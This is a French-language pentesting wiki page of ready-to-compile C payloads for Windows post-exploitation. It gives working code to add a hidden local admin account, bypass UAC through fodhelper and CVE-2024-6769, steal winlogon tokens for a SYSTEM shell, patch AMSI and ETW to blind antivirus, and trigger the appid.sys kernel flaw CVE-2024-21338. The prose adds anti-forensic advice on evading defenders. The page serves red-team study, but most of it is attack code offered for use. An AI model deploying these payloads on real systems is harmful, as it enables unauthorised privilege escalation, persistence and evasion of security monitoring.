# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Cette page rassemble de **petits snippets C autonomes** pratiques lors d'une Local Privilege Escalation sous Windows ou d'une post-exploitation. Chaque payload est conçu pour être **facile à copier-coller**, ne nécessite que l'API Windows / le runtime C et peut être compilé avec `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Ces payloads supposent que le processus dispose déjà des privilèges minimaux nécessaires pour effectuer l'action (par exemple `SeDebugPrivilege`, `SeImpersonatePrivilege` ou un contexte à intégrité moyenne pour un UAC bypass). Ils sont destinés aux environnements **red-team ou CTF**, où l'exploitation d'une vulnérabilité a permis l'exécution de code natif arbitraire.

---

## Ajouter un utilisateur administrateur local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Lorsque le binaire de confiance **`fodhelper.exe`** est exécuté, il interroge le chemin de registre ci-dessous **sans filtrer le verbe `DelegateExecute`**. En plaçant notre commande sous cette clé, un attaquant peut bypass UAC *sans déposer de fichier sur le disque*.<sup>[[1]](#references)</sup>

*Chemin de registre interrogé par `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC minimal qui lance un `cmd.exe` avec des privilèges élevés :
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testé sur Windows 10 22H2 et Windows 11 23H2 (correctifs de juillet 2025). Le bypass fonctionne toujours, car Microsoft n’a pas corrigé l’absence de contrôle d’intégrité dans le chemin `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Le remappage du lecteur + l’empoisonnement du cache du contexte d’activation fonctionnent toujours contre les builds corrigés de Windows 10/11, car `ctfmon.exe` s’exécute comme un processus d’interface utilisateur de confiance à haute intégrité qui charge volontiers depuis le lecteur `C:` usurpé par l’appelant et réutilise toutes les redirections DLL mises en cache par `CSRSS`. La procédure est la suivante : rediriger `C:` vers un stockage contrôlé par l’attaquant, déposer un `msctf.dll` trojanisé, lancer `ctfmon.exe` pour obtenir une haute intégrité, puis demander à `CSRSS` de mettre en cache un manifeste qui redirige une DLL utilisée par un binaire à élévation automatique (par exemple `fodhelper.exe`), afin que le prochain lancement charge votre payload sans invite UAC.<sup>[[5]](#references)</sup>

Workflow pratique :
1. Préparer une arborescence `%SystemRoot%\System32` factice et copier le binaire légitime que vous prévoyez de détourner (souvent `ctfmon.exe`).
2. Utiliser `DefineDosDevice(DDD_RAW_TARGET_PATH)` pour remapper `C:` dans votre processus, en conservant `DDD_NO_BROADCAST_SYSTEM` afin que la modification reste locale.
3. Déposer votre DLL et votre manifeste dans l’arborescence factice, appeler `CreateActCtx/ActivateActCtx` pour injecter le manifeste dans le cache du contexte d’activation, puis lancer le binaire à élévation automatique afin qu’il résolve la DLL redirigée directement vers votre shellcode.
4. Supprimer l’entrée du cache (`sxstrace ClearCache`) ou redémarrer une fois terminé afin d’effacer les traces de l’attaquant.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Conseil de nettoyage : après avoir obtenu SYSTEM, appelez `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, puis `sxstrace Parse` lors des tests — si le nom de votre manifest apparaît dans le log, les defenders peuvent également le voir ; faites donc tourner les paths à chaque exécution.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si le processus actuel détient **à la fois** les privilèges `SeDebug` et `SeImpersonate` (ce qui est typique de nombreux comptes de service), vous pouvez voler le token de `winlogon.exe`, le dupliquer et démarrer un processus elevated :
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Pour une explication plus approfondie de son fonctionnement, voir :

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La plupart des moteurs AV/EDR modernes s’appuient sur **AMSI** et **ETW** pour inspecter les comportements malveillants. Patcher ces deux interfaces dès le début dans le processus actuel empêche les payloads basés sur des scripts (par exemple PowerShell, JScript) d’être analysés.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Le patch ci-dessus est local au processus ; le lancement d’un nouveau PowerShell après son exécution s’effectuera sans inspection AMSI/ETW.*

---

## Créer un processus enfant en tant que Protected Process Light (PPL)
Demandez un niveau de protection PPL pour un processus enfant au moment de sa création à l’aide de `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Il s’agit d’une API documentée qui ne réussira que si l’image cible est signée pour la classe de signer demandée (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Niveaux les plus couramment utilisés :
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validez le résultat avec Process Explorer/Process Hacker en vérifiant la colonne Protection.

---

## Local Service -> Kernel via le Smart-Hash de `appid.sys` (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` expose un device object (`\\.\\AppID`) dont l’IOCTL de maintenance du smart-hash accepte des pointeurs de fonction fournis par l’utilisateur lorsque le caller s’exécute en tant que `LOCAL SERVICE` ; Lazarus exploite cette fonctionnalité pour désactiver la PPL et charger des drivers arbitraires. Les red teams devraient donc disposer d’un trigger prêt à l’emploi pour une utilisation en lab.<sup>[[6]](#references)</sup>

Notes opérationnelles :
- Vous avez toujours besoin d’un token `LOCAL SERVICE`. Volez-en un depuis `Schedule` ou `WdiServiceHost` à l’aide de `SeImpersonatePrivilege`, puis faites l’impersonation avant d’accéder au device afin que les vérifications ACL réussissent.
- L’IOCTL `0x22A018` attend une struct contenant deux pointeurs de callback (longueur de requête + fonction de lecture). Faites pointer les deux vers des stubs en user-mode qui construisent un token overwrite ou mappent des primitives ring-0, mais gardez les buffers RWX afin d’éviter que KernelPatchGuard ne plante au milieu de la chaîne.
- Après la réussite, sortez de l’impersonation et révoquez le handle du device ; les défenseurs recherchent désormais les handles `Device\\AppID` inattendus. Fermez-le donc immédiatement une fois les privilèges obtenus.

<details>
<summary>C - Skeleton trigger pour l’abus du smart-hash de `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Correctif minimal pour un build weaponized : mappez une section RWX avec `VirtualAlloc`, copiez-y votre stub de duplication de token, définissez `KernelThunk = section` et, une fois que `DeviceIoControl` a renvoyé son résultat, vous devriez être SYSTEM, même sous PPL.

---

## Références

- [1] [Première entrée : bienvenue et contournement fileless de l’UAC (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – lanceur de processus PPL minimal](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Fonction UpdateProcThreadAttribute (applications Win32) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Une nouvelle chaîne d’exploitation permet de contourner l’UAC de Windows](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus et le rootkit FudModule : au-delà du BYOVD avec un zero-day permettant de passer d’administrateur au kernel](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
